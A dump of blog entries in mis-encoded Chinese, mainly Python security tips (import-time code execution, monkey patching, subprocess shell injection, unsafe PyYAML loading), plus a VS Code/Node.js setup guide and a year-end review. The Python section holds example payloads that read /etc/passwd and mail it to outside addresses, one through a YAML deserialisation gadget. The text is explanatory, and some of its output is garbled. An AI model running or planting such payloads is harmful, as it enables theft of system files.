0.1 + 0.1 + 0.1 + 0.1Out[8]: 0.8999999999999999In [9]: 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1 + 0.1Out[9]: 0.9999999999999999 æˆ‘çœ‹åˆ°æœ‰ä½ç½‘å‹çš„æå‡ºçš„è§£å†³æ–¹æ¡ˆï¼š æˆ‘æœ‰ä¸€ä¸ªè§‚ç‚¹ï¼Œé’ˆå¯¹å°æ•°ç²¾åº¦ä¸å¤Ÿçš„é—®é¢˜ï¼ˆä¾‹å¦‚ 0.1ï¼‰ï¼Œè½¯ä»¶å¯ä»¥äººä¸ºçš„åœ¨æ•°æ®æœ€åŽä¸€ä½è¡¥ 5ï¼Œ ä¹Ÿå°±æ˜¯ 0.15ï¼Œè¿™æ ·ç‰ºç‰²ä¸€ä½ï¼Œä½†æ˜¯å¯ä»¥ä¿è¯æ•°æ®ç²¾åº¦ï¼Œè¿˜åŽŸå†æŠŠé‚£ä¸ªå°¾å·´ 5 åŽ»æŽ‰ã€‚1234567891011In [40]: 0.4 + 0.2Out[40]: 0.6000000000000001In [41]: (0.45 + 0.25) - (0.05 + 0.05)Out[41]: 0.In [49]: 0.6 + 0.3Out[49]: 0.8999999999999999In [50]: 0.65 + 0.35 - (0.05 + 0.05)Out[50]: 0.9 æœ€å¥½çš„å¤„ç†æŽªæ–½æ˜¯åªè¦æœ‰å¯èƒ½ï¼Œå°±åšæŒæ•´æ•°è¿ç®—ã€‚æ¬¡å¥½çš„å¤„ç†æŽªæ–½å¯èƒ½æ˜¯ä½¿ç”¨decimalæ¨¡å—ï¼Œå®ƒè¯•å›¾ä¿æŠ¤ç”¨æˆ·å…å—çç¢Žç»†èŠ‚å’Œå±é™©ç¼ºé™·ä¹‹è‹¦ã€‚ ç§æœ‰å±žæ€§Python ä¸æ”¯æŒå¯¹è±¡å±žæ€§éšè—, åŠæ—¶ä½ ä½¿ç”¨__æ¥ä¿æŠ¤ä½ çš„å˜é‡(private),åœ¨å†…éƒ¨ï¼Œpythonä¹Ÿä»…ä»…æ˜¯å°†å…¶åˆ«åäº†è€Œå·²ï¼Œè€Œè¿™ä¸ªåˆ«åçš„åŠ¨ä½œæ˜¯åœ¨è§£é‡Šå™¨è°ƒç”¨typeæ¥åˆ›å»ºclassæ—¶æ‰§è¡Œçš„çš„ã€‚123456789101112131415161718192021222324252627In [54]: class X(object): ...: def __init__(self): ...: self.__private = 1 ...: def get_private(self): ...: return self.__private ...: def has_private(self): ...: return hasattr(self, '__private') ...:In [55]: x = X()In [56]: x.has_private()Out[56]: FalseIn [57]: x.get_private()Out[57]: 1In [58]: x.__private = 2In [59]: x.__privateOut[59]: 2In [60]: hasattr(x, '__private')Out[60]: TrueIn [61]: x._X__privateOut[61]: 1 ç„¶åŽå¦‚æžœæˆ‘ä»¬åŽé¢åŠ¨æ€æ·»åŠ çš„å±žæ€§ï¼Œé‚£ä¹ˆæ˜¯ä¸ä¼šæœ‰è¿™ç§ä¿æŠ¤çš„(æ— è½¬æ¢å‘ç”Ÿ)12345In [62]: x.__privateOut[62]: 2In [63]: hasattr(x, '__private')Out[63]: True å¦‚æžœç¨‹åºå‘˜ä¾èµ–äºŽåŒä¸‹åˆ’çº¿å±žæ€§æ¥åœ¨ä»–ä»¬çš„ä»£ç ä¸­åšå‡ºé‡è¦å†³å®šï¼Œè€Œä¸å…³æ³¨ç§æœ‰å±žæ€§çš„ä¸å¯¹ç§°è¡Œä¸ºï¼Œé‚£ä¹ˆè¿™äº›å°æŠ€å·§ä¼šå˜æˆå®‰å…¨æ¼æ´ž æ¨¡å—æ‰§è¡Œè¯­å¥å®žé™…ä¸Šä¼šå¯¼è‡´å¯¼å…¥çš„æ¨¡å—ä¸­çš„ä»£ç çš„æ‰§è¡Œï¼Œè¿™ä¸€äº‹å®žå¹¶ä¸æ˜Žæ˜¾ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆç”šè‡³å¯¼å…¥ä¸å¯ä¿¡æ¨¡å—æˆ–åŒ…æ˜¯æœ‰é£Žé™©çš„ã€‚å¯¼å…¥åƒè¿™æ ·çš„ç®€å•æ¨¡å—å¯èƒ½ä¼šå¯¼è‡´ä¸æ„‰å¿«çš„ç»“æžœï¼š1234567891011$ cat malicious.pyimport osimport sysos.system('cat /etc/passwd | mail attacker@blackhat.com')del sys.modules['malicious'] # pretend it's not imported$ python&gt;&gt;&gt; import malicious&gt;&gt;&gt; dir(malicious)Traceback(most recent call last):NameError: name 'malicious' is not defined çŒ´å­è¡¥ä¸è¿è¡Œæ—¶ä¿®æ”¹ Python å¯¹è±¡å±žæ€§çš„è¿‡ç¨‹ç§°ä¹‹ä¸ºçŒ´å­è¡¥ä¸ ( monkey patching)ã€‚ä½œä¸ºåŠ¨æ€è¯­è¨€ï¼Œ Python å®Œå…¨æ”¯æŒè¿è¡Œæ—¶ç¨‹åºè‡ªçœå’Œä»£ç çªå˜ã€‚ä¸€æ—¦ä»¥æŸç§æ–¹å¼å¯¼å…¥äº†ä¸€ä¸ªæ¶æ„æ¨¡å—ï¼Œé‚£ä¹ˆä»»ä½•çŽ°æœ‰çš„å¯å˜å¯¹è±¡å¯è¢«ä¸çŸ¥ä¸è§‰åœ°åœ¨æ²¡æœ‰ç¨‹åºå‘˜åŒæ„çš„æƒ…å†µä¸‹è¢«æ‰“çŒ´å­è¡¥ä¸ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ Python åžƒåœ¾å›žæ”¶å™¨ ( gc.get_objects())æ¥æŽŒæ¡çŽ°æœ‰çš„æ‰€æœ‰å¯¹è±¡ï¼Œå¹¶é»‘è¿›å®ƒä»¬ä¸­ä»»æ„ä¸€ä¸ªã€‚ Python å¯¹è±¡çš„ç±»åž‹æ˜¯ç”± __class__ å±žæ€§å†³å®šçš„ã€‚é‚ªæ¶çš„æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¾é æ”¹å˜æ´»åŠ¨å¯¹è±¡çš„ç±»åž‹æ¥ä»¤äººç»æœ›åœ°æŠŠäº‹æƒ…æžç ¸ï¼š12345678910111213141516171819&gt;&gt;&gt; class X(object): pass...&gt;&gt;&gt; class Y(object): pass...&gt;&gt;&gt; x_obj = X()&gt;&gt;&gt; x_obj&lt;__main__.X object at 0x7f62dbe5e010 &gt;&gt;&gt;&gt; isinstance(x_obj, X)True&gt;&gt;&gt; x_obj.__class__ = Y&gt;&gt;&gt; x_obj&lt;__main__.Y object at 0x7f62dbe5d350 &gt;&gt;&gt;&gt; isinstance(x_obj, X)False&gt;&gt;&gt; isinstance(x_obj, Y)True&gt;&gt;&gt; å¯¹æŠ—æ¶æ„çŒ´å­è¡¥ä¸çš„å”¯ä¸€å¤„ç†æŽªæ–½æ˜¯ä¿è¯å¯¼å…¥çš„ Python æ¨¡å—çš„çœŸå®žæ€§å’Œå®Œæ•´æ€§, ä¸€ä¸ªç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨__slot__æ¥ä¿æŠ¤è‡ªå·±çš„ç±»ä¸è¢«æ³¨å…¥æ”»å‡»,ä½†æ˜¯è¿™åˆä¸§å¤±äº†ä¸€äº›çµæ´»æ€§ã€‚ é€šè¿‡subprocessè¿›è¡Œshellæ³¨å…¥ä»¥èƒ¶æ°´è¯­è¨€è‘—ç§°ï¼Œå¯¹Pythonè„šæœ¬æ¥è¯´ï¼Œé€šè¿‡è®©æ“ä½œç³»ç»Ÿæ¥æ‰§è¡Œå®ƒä»¬ï¼Œå¯èƒ½è¿˜æä¾›é¢å¤–çš„å‚æ•°ï¼Œæ¥å§”æ´¾ç³»ç»Ÿç®¡ç†ä»»åŠ¡ç»™å…¶ä»–ç¨‹åºï¼Œæ˜¯éžå¸¸å¸¸è§çš„ã€‚subprocessæ¨¡å—ä¸ºè¿™æ ·çš„ä»»åŠ¡æä¾›äº†æ˜“äºŽä½¿ç”¨å’Œç›¸å½“é«˜å±‚æ¬¡çš„æœåŠ¡ã€‚12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017å¹´ 1æœˆ10æ—¥ æ˜ŸæœŸäºŒ 13æ—¶11åˆ†53ç§’ CST0&gt;&gt;&gt; ä½†æœ‰ä¸€ä¸ªé™·é˜±ï¼è¦åˆ©ç”¨UNIX shellæœåŠ¡ï¼Œä¾‹å¦‚å‘½ä»¤è¡Œå‚æ•°æ‰©å±•ï¼Œcallå‡½æ•°çš„shellå…³é”®å­—å‚æ•°åº”è¯¥è®¾ç½®ä¸ºTrueã€‚ç„¶åŽåŽŸæ ·ä¼ é€’callå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ç»™ç³»ç»Ÿshellï¼Œç”¨ä»¥è¿›ä¸€æ­¥çš„è§£æžã€‚ä¸€æ—¦æ— æ•ˆçš„ç”¨æˆ·è¾“å…¥åˆ°è¾¾callå‡½æ•°(æˆ–è€…å…¶ä»–åœ¨ subprocess æ¨¡å—ä¸­å®žçŽ°çš„å‡½æ•°)ï¼Œé‚£ä¹ˆå°±ä¼šå¼€æ”¾ä¸€ä¸ªå£ç»™åº•å±‚ç³»ç»Ÿèµ„æºã€‚12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... æ˜¾ç„¶ï¼Œå°†shellå…³é”®å­—ä¿æŒé»˜è®¤å€¼Falseï¼Œå¹¶ä¸”æä¾›å‘½ä»¤åŠå…¶å‚æ•°çš„æ•°ç»„ç»™subprocesså‡½æ•°ï¼Œä¸è¦ä¸ºå¤–éƒ¨å‘½ä»¤æ‰§è¡Œè°ƒç”¨UNIX shellï¼Œè¿™æ ·ä¼šå®‰å…¨å¾—å¤šã€‚åœ¨è¿™ç¬¬äºŒæ¬¡è°ƒç”¨æ ¼å¼ï¼Œå‘½ä»¤æˆ–è€…å®ƒçš„å‚æ•°éƒ½ä¸ä¼šè¢«shellè§£æžæˆ–å±•å¼€ã€‚å¦‚æžœåº”ç”¨çš„æœ¬è´¨å†³å®šäº†ä½¿ç”¨UNIX shellæœåŠ¡ï¼Œé‚£ä¹ˆæ¸…ç†ä¸€åˆ‡åˆ° subprocessçš„å‚æ•°ï¼Œç¡®ä¿æ²¡æœ‰ä¸æƒ³è¦çš„shellåŠŸèƒ½å¯ä»¥è¢«æ¶æ„ç”¨æˆ·åˆ©ç”¨ï¼Œè¿™å®Œå…¨æ˜¯é‡è¦çš„ã€‚åœ¨æ›´æ–°çš„Pythonç‰ˆæœ¬ä¸­ï¼Œå¯ä»¥ç”¨æ ‡å‡†åº“çš„shlex.quoteå‡½æ•°æ¥è¿›è¡Œshellè½¬ä¹‰ã€‚ åºåˆ—åŒ–-pyYAMLä½œä¸ºä¸€ä¸ªæµè¡Œçš„é…ç½®æ–‡ä»¶æ ¼å¼ï¼ŒYAMLä¸ä¸€å®šè¢«è®¤ä¸ºæ˜¯ä¸€ä¸ªèƒ½å¤Ÿè¯±ä½¿ååºåˆ—åŒ–å™¨æ‰§è¡Œä»»æ„ä»£ç çš„å¼ºå¤§çš„åºåˆ—åŒ–åè®®ã€‚è®©å®ƒç”šè‡³æ›´å±é™©çš„æ˜¯ï¼Œäº‹å®žä¸ŠPythonçš„YAMLé»˜è®¤å®žçŽ°â€”-PyYAMLè®©ååºåˆ—åŒ–çœ‹èµ·æ¥éžå¸¸æ— è¾œï¼š1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; è€Œ/etc/passwdå·²ç»è¢«çªƒå–äº†ã€‚ä¸€ä¸ªå»ºè®®çš„è§£å†³æ–¹æ³•æ˜¯æ€»æ˜¯ä½¿ç”¨ yaml.safe_loadæ¥å¤„ç†é‚£äº›ä½ ä¸ä¿¡ä»»çš„YAMLåºåˆ—åŒ–ã€‚å°½ç®¡å¦‚æ­¤ï¼Œç›®å‰çš„PyYAMLé»˜è®¤æ„Ÿè§‰æœ‰äº›é©±ä½¿äººè€ƒè™‘å…¶ä»–å€¾å‘äºŽä¸ºç›¸ä¼¼çš„ç›®çš„ä½¿ç”¨ dump/ loadå‡½æ•°åï¼ˆä½†æ˜¯ä»¥ä¸€ç§å®‰å…¨çš„æ–¹å¼çš„åºåˆ—åŒ–åº“]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>python_tips</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨VSCodeå¿«é€Ÿæ­å»ºNodeJSå¼€å‘çŽ¯å¢ƒ]]></title>
    <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
    <content type="text"><![CDATA[æ–‡æœ¬çš„ç›®çš„æ˜¯å¿«é€Ÿæ­å»ºNodeJSçš„å¼€å‘çŽ¯å¢ƒï¼ŒNodeJSçš„å¸¸è§çš„å¼€å‘æ–¹å¼æœ‰2ç§ï¼Œä¸€ç§æ˜¯ç¼–è¾‘å™¨ï¼Œä¸€ç§æ˜¯IDEã€‚ç¼–è¾‘å™¨æŽ¨èä½¿ç”¨å¾®è½¯å‡ºå“çš„vscdoeï¼Œå› ä¸ºå…¶å¯åŠ¨é€Ÿåº¦å¿«ï¼Œè½»é‡çº§ï¼Œæ‰§è¡Œç®€å•ï¼Œè°ƒè¯•æ–¹ä¾¿ï¼Œè¿˜æœ‰ç•Œé¢æ¼‚äº®ã€‚è€ŒIDE æ— å¯åŽšéžçš„å°±æ˜¯WebStormäº†ã€‚è¿™é‡Œä½¿ç”¨vscdoeæ­å»ºå¼€å‘çŽ¯å¢ƒï¼Œå› ä¸ºIDEçœŸçš„æ¯”è¾ƒè€—å†…å­˜ã€‚é™¤éžå¼€å‘å¤§åž‹é¡¹ç›®,å¦åˆ™è½»æ˜“æˆ‘ä¸å¼€IDEã€‚ VSCodeç®€ä»‹VSCodeå…¨ç§°æ˜¯Visual Studio Code, ç”±å¾®è½¯å‡ºå“,ä½†å®ƒä¸æ˜¯é‚£ä¸ªå¤§å—å¤´çš„Visual Studio ,å®ƒæ˜¯ä¸€ä¸ªç²¾ç®€ç‰ˆçš„è¿·ä½ Visual Studioï¼Œå¹¶ä¸”ï¼ŒVisual Studio Codeå¯ä»¥è·¨ï¼å¹³ï¼å°ï¼Windowsã€Macå’ŒLinuxé€šç”¨ã€‚ å®‰è£…VSCodeå¯ä»¥é€šè¿‡å®˜æ–¹ä¸‹è½½, ç”±äºŽä½ æˆ‘éƒ½æ‡‚çš„åŽŸå› ï¼Œå¯èƒ½æ— æ³•è®¿é—®ï¼Œå› æ­¤ä½ å¯èƒ½ä¼šéœ€è¦ä½¿ç”¨å›½å†…é•œåƒ,ç›´æŽ¥ä¸‹macç‰ˆæœ¬çš„å®‰è£…åŒ…ï¼Œå®‰è£…ã€‚ è¿è¡Œåœ¨VS Codeä¸­ï¼Œæˆ‘ä»¬å¯ä»¥éžå¸¸æ–¹ä¾¿åœ°è¿è¡ŒJavaScriptæ–‡ä»¶ã€‚ VS Codeä»¥æ–‡ä»¶å¤¹ä½œä¸ºå·¥ç¨‹ç›®å½•ï¼ˆWorkspace Dirï¼‰ï¼Œæ‰€æœ‰çš„JavaScriptæ–‡ä»¶éƒ½å­˜æ”¾åœ¨è¯¥ç›®å½•ä¸‹ã€‚æ­¤å¤–ï¼ŒVS Codeåœ¨å·¥ç¨‹ç›®å½•ä¸‹è¿˜éœ€è¦ä¸€ä¸ª.vscodeçš„é…ç½®ç›®å½•ï¼Œé‡Œé¢å­˜æ”¾é‡ŒVS Codeéœ€è¦çš„é…ç½®æ–‡ä»¶ã€‚ å‡è®¾æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªhelloçš„å·¥ç¨‹ï¼Œå› æ­¤æˆ‘éœ€è¦ä¸€ä¸ªhelloçš„ç›®å½•ä½œä¸ºå·¥ç¨‹ç›®å½•ï¼Œç„¶åŽåœ¨é‡Œé¢ç¼–å†™hello.jsæ–‡ä»¶ï¼Œåˆ™è¯¥å·¥ç¨‹ç›®å½•çš„ç»“æž„å¦‚ä¸‹ï¼š1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript ç„¶åŽåˆ‡æ¢åˆ°debugæ¨¡å¼è¿›è¡Œè¿è¡Œï¼Œå…³äºŽdebugæ¨¡å¼åŽé¢ä»‹ç»ã€‚å¯¹äºŽæ›´ç»†èŠ‚ç›¸å…³çš„æ–‡æ¡£å¯ä»¥å‚è€ƒå¾®è½¯å®˜æ–¹æä¾›çš„JavaScript in VS Code æ™ºèƒ½æç¤ºå› ä¸ºä¹‹å‰å¾®è½¯æŽ¨å‡ºäº†typescriptè¯­è¨€ï¼Œç»“åˆtsdæ–‡ä»¶ï¼Œç”¨visual studioå†™typescriptä»£ç æ˜¯ç›¸å½“çˆ½çš„ï¼Œæ™ºèƒ½æç¤ºçš„åŠŸèƒ½éžå¸¸nbã€‚ è¿™ä¸ªåŠŸèƒ½ç†æ‰€åº”å½“ä¹Ÿè¢«vscodeç»§æ‰¿äº†ï¼Œä½†æ˜¯çŽ°åœ¨tsdé¡¹ç›®å·²ç»è¿‡æœŸäº†ï¼ŒæŽ¥è¿‡è¿™ä¸ªæŽ¥åŠ›æ£’çš„æ˜¯typings å› æ­¤æˆ‘ä»¬å°†é€šè¿‡Typingsæ¥å®žçŽ°JavaScriptæ™ºèƒ½æç¤ºåŠŸ æ³¨æ„äº‹é¡¹ å®‰è£…NPM NPMæ˜¯å’ŒNode.jsä¸€èµ·å®‰è£…çš„ï¼Œå¦‚æžœä½ æƒ³ä½¿ç”¨NPMçš„è¯ï¼Œé‚£ä¹ˆä½ åº”è¯¥å…ˆå®‰è£…Node.js Typings vs TSD Typingsä½œä¸ºTSDçš„æ›¿ä»£è€…è€Œå‡ºçŽ°çš„ï¼Œå¦‚æžœä½ å·²ç»å®‰è£…äº†TSDï¼Œé‚£ä¹ˆéœ€è¦çŸ¥é“çŽ°åœ¨TSDå·²ç»ä¸æŽ¨èä½¿ç”¨äº†ã€‚å¦‚æžœå·²ç»å®‰è£…TSDè¯·æ‰§è¡Œä¸‹é¢çš„å‘½ä»¤æ¥ç§»é™¤å®ƒ1npm rm -g tsd CNPM åœ¨å›½å†…ç”±äºŽå¢™çš„åŽŸå› ï¼Œå¤§éƒ¨åˆ†æ—¶å€™ä½¿ç”¨NPMå®‰è£…æ¨¡å—çš„é€Ÿåº¦ä¸Šä¼šå¾ˆæ…¢ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å…¶å®žå¯ä»¥é€‰æ‹©å›½å†…æ·˜å®çš„NPMé•œåƒï¼Œå…³äºŽæ·˜å®NPMé•œåƒçš„ä½¿ç”¨æ–¹æ³•å¯ä»¥å‚è€ƒæ·˜å® NPM é•œåƒ ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥è¿›è¡Œå®‰è£…å’Œä½¿ç”¨12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa å®‰è£…Typingsæˆ‘ä»¬é€šè¿‡cnpmæ¥å®‰è£…typings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 é…ç½®æ™ºèƒ½æç¤ºå®‰è£…å®ŒæˆåŽï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…ç›¸åº”çš„éœ€è¦æç¤ºåŠŸèƒ½åº“æˆ–è€…æ¡†æž¶çš„ç±»åž‹ä¿¡æ¯æ–‡ä»¶ï¼Œåœ¨è¿™é‡Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ NodeSnippetï¼Œä¸ºäº†äº†è§£Typingsçš„ä½¿ç”¨æ–¹æ³•ï¼Œä½ å¯èƒ½éœ€è¦ç®€å•çœ‹çœ‹typings github ä½¿ç”¨å‘½ä»¤è¡Œè¿›å…¥åˆ°è¯¥ç›®å½•ä¸­ï¼Œåˆ†åˆ«è¾“å…¥ä¸‹é¢ä¸¤ä¸ªå‘½ä»¤æ¥å®‰è£…Nodeå’ŒLodashçš„ç±»åž‹æŽ¥å£ä¿¡æ¯æ–‡ä»¶ï¼š12typings install dt~node --global --savetypings install lodash --save è¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„ NodeSnippetç›®å½•ä¸­å¤šäº†ä¸€äº›æ–‡ä»¶ï¼š12345678910111213 maojun@maojun-mbp$ tree ..â”œâ”€â”€ typingsâ”‚ â”œâ”€â”€ globalsâ”‚ â”‚ â””â”€â”€ nodeâ”‚ â”‚ â”œâ”€â”€ index.d.tsâ”‚ â”‚ â””â”€â”€ typings.jsonâ”‚ â”œâ”€â”€ index.d.tsâ”‚ â””â”€â”€ modulesâ”‚ â””â”€â”€ lodashâ”‚ â”œâ”€â”€ index.d.tsâ”‚ â””â”€â”€ typings.jsonâ””â”€â”€ typings.json è¿™äº›æ–‡ä»¶å°±æ˜¯ä¸ºæˆ‘ä»¬æä¾›æç¤ºä¿¡æ¯çš„ç±»åž‹ç±»åž‹æ–‡ä»¶(ä½¿ç”¨TypeScriptå®šä¹‰)ã€‚æŸ¥çœ‹Typingsæ˜¯å¦æ”¯æŒæŸä¸ªåº“æˆ–æ¡†æž¶çš„æ™ºèƒ½æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„å‘½ä»¤:1typings search exampleName å¯åŠ¨æ™ºèƒ½æç¤ºé…ç½®å¥½äº†ç±»åž‹æŽ¥å£åŽï¼Œå¯ä»¥é€šè¿‡ä¸¤ç§æ–¹å¼æ¥å¯åŠ¨æç¤ºåŠŸèƒ½ï¼š æ–‡ä»¶å¤´åŠ æ³¨é‡Š 1/// &lt;reference path="./typings/index.d.ts" /&gt; åœ¨ç›®å½•(åœ¨è¿™é‡Œæ˜¯NodeSnippetæ–‡ä»¶å¤¹ä¸­)å¢žåŠ ä¸€ä¸ªåä¸ºjsconfig.jsonçš„ç©ºæ–‡ä»¶ æ›´å¤šjsconfig.jsonæ–‡ä»¶çš„å†…å®¹å¯ä»¥å‚è€ƒï¼š JavaScript in VS Code è¿™æ ·æˆ‘ä»¬å†™ä»£ç çš„æ—¶å€™å°±æœ‰æ™ºèƒ½æç¤ºåŠŸèƒ½äº†ï¼Œ æ•ˆæžœå¦‚ä¸‹: è°ƒè¯•å¦‚ä½•è°ƒè¯•å†™å¥½äº†çš„JSç¨‹åºå–ƒï¼Ÿ ç”¨VS Codeå¿«é€Ÿåˆ›å»ºlaunch.jsonæ–‡ä»¶, ä¸»è¦æ˜¯ä¿®æ”¹programè¿™ä¸ªå‚æ•°ï¼ŒæŒ‡æ˜Žä½  å¯æ‰§è¡Œæ–‡ä»¶ä½ç½®ã€‚ å…³äºŽDebugçš„ç»†èŠ‚ï¼Œè¯·å‚è€ƒDebugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "å¯åŠ¨ç¨‹åº", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "é™„åŠ åˆ°è¿›ç¨‹", "port": 5858 &#125; ]&#125; æ•ˆæžœå¦‚ä¸‹:]]></content>
      <categories>
        <category>å¼€å‘è¯­è¨€</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[2016æ€»ç»“ä¸Ž2017è®¡åˆ’]]></title>
    <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
    <content type="text"><![CDATA[å­”å­æ›°:â€å¾æ—¥ä¸‰çœå¾èº«â€, å¹³æ—¶å¾ˆå°‘ä¼šé™ä¸‹å¿ƒæ¥åçœå’Œæ€»ç»“ä¸€æ®µæ—¶é—´çš„åŠŸä¸Žè¿‡, 2016é©¬ä¸Šå°±è¦è¿‡åŽ»äº†ï¼Œåœ¨è¿™ä¸€å¹´å°†è¦ç»“æŸä¹‹æ—¶, è¿˜æ˜¯æƒ³å›žè¿‡ä¸€ä¸‹è¿™ä¸€å¹´æ¥çš„å¾—ä¸Žå¤±, é¡ºä¾¿å®‰æŽ’ä¸‹æ¥å¹´çš„è®¡åˆ’ã€‚ è®°å½•ä¸‹è¿™ä¸€å¹´æ¥è‡ªå·±çš„å˜åŒ–, åŒæ—¶ä¹Ÿä¸ºæ¥å¹´å†æˆ˜ä½œå‡†å¤‡, è€Œä¸”æˆ‘è¿™äººè®°æ€§ä¸å¥½, ç•™ä¸ªåº•,ç…§äº®è‡ªå·±éœ€è¦èµ°çš„è·¯ã€‚ è½¬çž¬å³é€çš„20162016æ˜¯ç¹å¿™çš„ä¸€å¹´ï¼Œå·¥ä½œä¸Šå¤„å¤„å……æ»¡æŒ‘æˆ˜ï¼Œæœ‰äº›æŒ‘æˆ˜æ˜¯è‡ªå·±å–œæ¬¢çš„ï¼Œæœ‰äº›æŒ‘æˆ˜ä¹Ÿæ˜¯è‡ªå·±æ¯”è¾ƒæŠµè§¦çš„ï¼Œæˆ‘å–œæ¬¢å¼€å‘ï¼Œä»Žè¿ç»´å¼€å‘è½¬è€Œå‚ä¸Žå¤§åž‹ç³»ç»Ÿå¼€å‘ï¼Œè¿™çš„ç¡®æ˜¯ä¸€ä¸ªä¸å°çš„æŒ‘æˆ˜ï¼Œæˆ‘æ˜¯ä¸€ä¸ªå¯¹æŠ€æœ¯æœ‰ç‚¹æ¿€æƒ…çš„äººï¼Œå› æ­¤è¿™ä¸ªæŒ‘æˆ˜å¯¹æˆ‘è€Œè¨€è¿˜æ˜¯æ¯”è¾ƒå–œæ¬¢çš„ã€‚åŽæ¥åŒæ—¶åšèµ·äº†äº§å“è®¾è®¡, æ¯å¤©æ‰£è„‘è¢‹, çœ‹åˆ«äººçš„äº§å“ï¼Œç”»äº§å“è®¾è®¡å›¾ï¼Œ è¿™äº›åœ¨å½“æ—¶çš„æˆ‘æ˜¯å¾ˆæŠµè§¦çš„, å½“æ—¶æˆ‘è¿˜å¤„äºŽå•çº¯çš„æƒ³ç§¯ç´¯æŠ€æœ¯çš„é˜¶æ®µã€‚çŽ°åœ¨çœ‹æ¥è¿™æ®µç»åŽ†ä¹Ÿæ˜¯æˆ‘å®è´µçš„è´¢å¯Œ, æ¯•ç«Ÿäº§å“å†³å®šä¸œè¥¿çš„ä»·å€¼ï¼Œç”¨å†ç‰›å‰çš„æŠ€æœ¯,åšä¸€ä¸ªæ²¡æœ‰ä»·å€¼çš„ä¸œè¥¿, è¿™æ˜¯ä¸€ä»¶æ„šè ¢çš„è¡Œä¸ºï¼Œæˆ‘è¿™é‡Œè¯´çš„ä»·å€¼æ˜¯é•¿è¿œä»·å€¼ï¼Œè€Œä¸æ˜¯å½“ä¸‹çœ‹èµ·æ¥æœ‰ä»·å€¼, è¿™ä¸ªè¯´èµ·æ¥å¾ˆæ‚¬ï¼Œä»¥åŽæœ‰æœºä¼šæ·±å…¥è®¨è®ºè¿™ä¸ªã€‚ 2016è¿™ä¸€å¹´ä¹Ÿåœ¨å’ŒJumpServerä¸€åŒæˆé•¿çš„ä¸€å¹´ï¼Œæ„Ÿè§¦ä¹Ÿè›®å¤šçš„ï¼Œé¦–å…ˆæ˜¯æŠ€æœ¯çš„æˆé•¿ï¼Œä¸€ä¸ªå¼€æºäº§å“çš„æŠ€æœ¯çš„è¿­ä»£ï¼Œæˆ‘ä»¬è‡´åŠ›äºŽè®¾è®¡NBçš„äº§å“å’Œå†™å‡ºæ¼‚äº®çš„ä»£ç ã€‚å…¶æ¬¡ä¸ºæœ‰å¯èƒ½çš„èžèµ„è°ˆåˆ¤è€Œå…´å¥‹è¿‡ï¼Œç„¶è€Œæœ€åŽè¿˜æ˜¯å¹³é™ä¸‹æ¥, æ…¢æ…¢åšä¸€ä¸ªè‡ªå·±è®¤å¯çš„èƒ½åŠ›èŒƒå›´ä¹‹å†…çš„äº§å“ã€‚ å·¥ä½œä¸Šçš„äº‹å„¿, æ€»æ˜¯æœ‰é‚£ä¹ˆç‚¹ç´§ç»·, 